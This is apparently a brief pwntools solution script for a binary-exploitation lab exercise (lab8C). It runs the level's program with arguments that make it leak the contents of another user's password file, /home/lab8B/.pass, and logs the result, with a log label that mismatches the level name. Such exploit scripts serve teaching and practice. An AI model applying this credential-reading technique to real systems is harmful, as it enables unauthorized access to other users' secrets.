from pwn import *

r = process(["/levels/lab08/lab8C", "-fn=/home/lab8B/.pass", "-fd=3"])
r.recvuntil("equivalent to \"")
password = r.recv(20)
log.info("lab6B password: {}".format(password))
